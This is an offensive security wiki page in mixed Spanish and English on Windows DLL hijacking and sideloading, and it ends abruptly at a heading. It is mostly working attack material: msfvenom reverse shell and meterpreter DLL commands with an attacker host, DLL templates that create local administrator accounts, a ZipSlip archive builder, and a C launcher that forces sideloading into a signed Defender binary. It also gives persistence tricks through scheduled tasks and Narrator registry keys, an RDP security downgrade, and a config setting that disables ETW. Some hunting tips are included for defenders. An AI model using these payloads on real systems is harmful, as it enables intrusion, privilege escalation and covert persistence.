# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking implica manipular una aplicación confiable para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection y Side-Loading**. Se utiliza principalmente para ejecución de código, lograr persistencia y, con menor frecuencia, escalada de privilegios. A pesar del enfoque en escalada aquí, el método de hijacking sigue siendo consistente entre objetivos.

### Common Techniques

Se emplean varios métodos para DLL hijacking, cada uno con su eficacia dependiendo de la estrategia de carga de DLL de la aplicación:

1. **DLL Replacement**: Sustituir una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para preservar la funcionalidad original de la DLL.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que una aplicación la cargue, creyendo que es una DLL requerida inexistente.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación a la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una contraparte maliciosa en el directorio WinSxS, un método a menudo asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, similar a técnicas de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

El clásico DLL sideloading no es la única forma de hacer que un proceso confiable de **.NET Framework** cargue código del atacante. Si el ejecutable objetivo es una aplicación **managed**, el CLR también consulta un **application configuration file** con el nombre del ejecutable (por ejemplo `Setup.exe.config`). Ese archivo puede definir un **AppDomainManager** personalizado. Si el config apunta a un assembly controlado por el atacante colocado junto al EXE, el CLR lo carga **antes de la ruta normal de código de la aplicación** y se ejecuta dentro del proceso confiable.

Según el esquema de configuración de .NET Framework de Microsoft, tanto `<appDomainManagerAssembly>` como `<appDomainManagerType>` deben estar presentes para que se use el gestor personalizado.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Administrador minimalista:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas prácticas:
- Esto es tradecraft específico de **.NET Framework**. Depende del parsing de la configuración de CLR, no del orden de búsqueda de DLL de Win32.
- El host debe ser realmente un **managed EXE**. Triage rápido: `sigcheck -m target.exe`, `corflags target.exe`, o comprobar el **CLR Runtime Header** en los metadatos PE.
- El nombre del archivo de configuración debe coincidir exactamente con el nombre del ejecutable (`<binary>.config`) y normalmente reside **junto al EXE**.
- Esto es útil con **signed Microsoft/vendor binaries** porque el EXE de confianza permanece intacto mientras la assembly managed maliciosa se ejecuta dentro del proceso.
- Si ya tienes un directorio de instalador/actualización escribible, AppDomainManager hijacking puede usarse como la **primera fase**, seguido de classic DLL sideloading o reflective loading para fases posteriores.

### Hijacking de una tarea programada existente para relanzar la cadena de sideload

Para persistence, no te limites a buscar **crear una nueva tarea**. Algunos intrusion sets esperan hasta que un instalador legítimo crea una **normal updater task** y luego **reescriben la acción de la tarea** para que el nombre existente, el autor y el trigger sigan pareciendo normales a los defensores.

Flujo de trabajo reutilizable:
1. Instala/ejecuta el software legítimo e identifica la tarea que normalmente crea.
2. Exporta el XML de la tarea y anota los valores actuales de `<Exec><Command>` / `<Arguments>`.
3. Sustituye solo la acción para que la tarea inicie tu **trusted host EXE** desde un directorio de staging escribible por el usuario, que luego haga side-load o AppDomain-load del payload real.
4. Vuelve a registrar el mismo nombre de tarea en lugar de crear un nuevo artefacto de persistence obvio.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Por qué es más stealthier:
- El nombre de la task todavía puede parecer legítimo (por ejemplo, un vendor updater).
- El **Task Scheduler service** lo lanza, así que la validación de parent/ancestor a menudo ve la cadena de scheduling esperada en lugar de `explorer.exe`.
- Los equipos DFIR que solo buscan **new task names** pueden pasar por alto una task cuya registration ya existía, pero cuya action ahora apunta a `%LOCALAPPDATA%`, `%APPDATA%`, o a otra ruta controlada por el atacante.

Pivotes rápidos de hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compara los XML de `C:\Windows\System32\Tasks\*` y los metadatos de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` contra una baseline.
- Genera una alerta cuando una **vendor-looking updater task** se ejecuta desde **user-writable directories** o lanza un .NET EXE con un archivo `*.config` colocalizado.

> [!TIP]
> Para una cadena paso a paso que combina HTML staging, configs AES-CTR y .NET implants sobre DLL sideloading, revisa el workflow de abajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

La forma más común de encontrar missing Dlls dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

y mostrando solo la **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Si estás buscando **missing dlls en general** deja esto ejecutándose durante algunos **segundos**.\
Si estás buscando un **missing dll dentro de un executable específico** debes configurar **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo y detener la captura de eventos**.

## Exploiting Missing Dlls

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir un dll que un proceso con privilegios intentará cargar** en algún **lugar donde se va a buscar**. Por tanto, podremos **escribir** un dll en una **carpeta** donde el **dll se busca antes** que la carpeta donde está el **dll original** (caso raro), o podremos **escribir en alguna carpeta donde se va a buscar el dll** y el **dll** original no existe en ninguna carpeta.

### Dll Search Order

**Dentro de la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente los Dlls.**

Las **Windows applications** buscan DLLs siguiendo un conjunto de **pre-defined search paths**, respetando una secuencia concreta. El problema del DLL hijacking surge cuando un DLL malicioso se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que el DLL auténtico. Una solución para evitar esto es asegurarse de que la aplicación use absolute paths al referirse a los DLLs que necesita.

Puedes ver el **DLL search order on 32-bit** systems abajo:

1. El directorio desde el que se cargó la aplicación.
2. El system directory. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
3. El 16-bit system directory. No existe una función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
4. El Windows directory. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
1. (_C:\Windows_)
5. El current directory.
6. Los directorios que están listados en la variable de entorno PATH. Ten en cuenta que esto no incluye el per-application path especificado por la registry key **App Paths**. La key **App Paths** no se usa al calcular el DLL search path.

Ese es el orden de búsqueda **default** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el current directory pasa al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (por defecto está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-loaderapi-loadlibraryexa) se llama con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del executable module que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **un dll podría cargarse indicando la absolute path en lugar de solo el nombre**. En ese caso ese dll **solo se va a buscar en esa ruta** (si el dll tiene dependencias, se van a buscar como si se hubieran cargado por nombre).

Hay otras formas de alterar los ways to alter the search order pero no voy a explicarlas aquí.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Usa filtros de **ProcMon** (`Process Name` = target EXE, `Path` termina en `.dll`, `Result` = `NAME NOT FOUND`) para recopilar nombres de DLL que el proceso consulta pero no encuentra.
2. Si el binary se ejecuta bajo una **schedule/service**, dejar caer un DLL con uno de esos nombres en el **application directory** (search-order entry #1) hará que se cargue en la siguiente ejecución. En un caso de un scanner .NET, el proceso buscó `hostfxr.dll` en `C:\samples\app\` antes de cargar la copia real desde `C:\Program Files\dotnet\fxr\...`.
3. Construye un payload DLL (por ejemplo, reverse shell) con cualquier export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si tu primitive es un **ZipSlip-style arbitrary write**, crea un ZIP cuya entrada escape del extraction dir para que el DLL termine en la carpeta de la app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entrega el archivo al inbox/share vigilado; cuando la tarea programada vuelva a lanzar el proceso, cargará la DLL maliciosa y ejecutará tu código como la cuenta del servicio.

### Forzando sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en el DLL search path de un proceso recién creado es establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS al crear el proceso con las APIs nativas de ntdll. Al proporcionar aquí un directorio controlado por el atacante, un proceso objetivo que resuelva una DLL importada por nombre (sin ruta absoluta y sin usar los safe loading flags) puede ser forzado a cargar una DLL maliciosa desde ese directorio.

Idea clave
- Construye los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde vive tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará este DllPath proporcionado durante la resolución, permitiendo sideloading fiable incluso cuando la DLL maliciosa no está en la misma ubicación que el EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se está creando; es diferente de SetDllDirectory, que solo afecta al proceso actual.
- El objetivo debe importar o LoadLibrary una DLL por nombre (sin ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y rutas absolutas hardcoded no pueden ser hijacked. Los forwarded exports y SxS pueden cambiar la precedencia.

Ejemplo mínimo en C (ntdll, wide strings, manejo de errores simplificado):

<details>
<summary>Ejemplo completo en C: forzar DLL sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o haciendo proxy al real) en tu directorio DllPath.
- Inicia un binario firmado conocido por buscar xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación mediante el DllPath proporcionado y sideloads tu DLL.

Esta técnica se ha observado en-the-wild para impulsar cadenas multi-stage de sideloading: un launcher inicial deja caer una DLL helper, que luego spawnea un binario firmado por Microsoft, susceptible a hijacking, con un DllPath personalizado para forzar la carga de la DLL del atacante desde un directorio de staging.


### .NET AppDomainManager hijacking via `.exe.config`

Para targets de **.NET Framework**, el sideloading puede hacerse **antes de `Main()`** sin parchear memoria abusando del archivo adyacente **`.exe.config`** de la aplicación. En lugar de depender solo del orden de búsqueda de DLL de Win32, el atacante coloca un EXE legítimo de .NET junto a un config malicioso y uno o más assemblies controlados por el atacante.

Cómo funciona la cadena:
1. El EXE host se inicia y el **CLR lee `<exe>.config`**.
2. El config establece **`<appDomainManagerAssembly>`** y **`<appDomainManagerType>`** para que el runtime instancie un `AppDomainManager` controlado por el atacante.
3. El manager malicioso obtiene ejecución **pre-`Main()`** dentro del proceso confiable del host.
4. El mismo config puede forzar al CLR a resolver primero los assemblies locales (por ejemplo `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) y puede debilitar la validación/telemetría del runtime sin parcheo inline.

Patrón de estilo campaña (el anidamiento exacto puede variar según la directiva / versión de CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, turning the folder into a predictable sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** move execution into attacker code during CLR initialization, before the legitimate app logic runs.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** makes runtime selection more deterministic.
- **`<etwEnable enabled="false"/>`** is especially interesting because the **CLR disables its own ETW visibility** from configuration instead of the implant patching `EtwEventWrite` in memory.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar las imports de un executable y las exports de un dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos la Dll que compiles debe **exportar varias funciones** que van a ser cargadas por el proceso víctima; si estas funciones no existen, el **binary won't be able to load** y el **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL alternativo en C con entrada de hilo</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso de estudio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe todavía inspecciona al inicio una DLL de localización predecible y específica del idioma, que puede ser hijacked para ejecución arbitraria de código y persistence.

Datos clave
- Ruta inspeccionada (builds actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta heredada (builds antiguos): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL escribible controlada por el attacker en la ruta OneCore, se carga y se ejecuta `DllMain(DLL_PROCESS_ATTACH)`. No se requieren exports.

Detección con Procmon
- Filtro: `Process Name is Narrator.exe` y `Operation is Load Image` o `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta anterior.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Un hijack ingenuo hablará/destacará la UI. Para permanecer en silencio, al adjuntarte enumera los threads de Narrator, abre el thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y haz `SuspendThread` sobre él; continúa en tu propio thread. Ver el PoC para el código completo.

Trigger and persistence via Accessibility configuration
- Contexto de usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al iniciar Narrator se carga la DLL plantada. En el secure desktop (pantalla de inicio de sesión), pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Permitir classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP al host, en la pantalla de inicio de sesión pulsa CTRL+WIN+ENTER para lanzar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.
- La ejecución se detiene cuando la sesión RDP se cierra—inyecta/migra rápidamente.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada de registro de una Accessibility Tool (AT) integrada (por ejemplo, CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y luego establecer `configuration` con ese nombre de AT. Esto actúa como proxy para ejecución arbitraria bajo el framework de Accessibility.

Notes
- Escribir en `%windir%\System32` y cambiar valores HKLM requiere privilegios de admin.
- Toda la lógica del payload puede vivir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), rastreado como **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM bajo el contexto del usuario que ha iniciado sesión.
- **Directory Permissions**: Escribible por `CREATOR OWNER`, lo que permite a usuarios locales soltar archivos arbitrarios.
- **DLL Search Behavior**: Intenta cargar `hostfxr.dll` desde su directorio de trabajo primero y registra "NAME NOT FOUND" si falta, lo que indica prioridad de búsqueda en el directorio local.

### Exploit Implementation

Un atacante puede colocar un stub malicioso de `hostfxr.dll` en el mismo directorio, explotando la DLL faltante para lograr ejecución de código bajo el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM bajo el contexto del usuario actual.
3. Si hay un administrador conectado cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de bypass de UAC para elevar de integridad media a privilegios SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frecuentemente combinan droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso confiable y firmado.

Chain overview
- El usuario descarga el MSI. Un CustomAction se ejecuta silenciosamente durante la instalación GUI (por ejemplo, LaunchApplication o una acción VBScript), reconstruyendo la siguiente etapa desde recursos embebidos.
- El dropper escribe un EXE legítimo y firmado y una DLL maliciosa en el mismo directorio (ejemplo: wsc_proxy.exe firmado por Avast + wsc.dll controlado por el atacante).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLL de Windows carga primero wsc.dll desde el directorio de trabajo, ejecutando el código del atacante bajo un proceso padre firmado (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabla CustomAction:
- Busca entradas que ejecuten ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo embebido en segundo plano.
- En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads embebidos/divididos en el CAB del MSI:
- Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- O usa lessmsi: lessmsi x package.msi C:\out
- Busca múltiples fragmentos pequeños que sean concatenados y descifrados por un CustomAction de VBScript. Flujo común:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
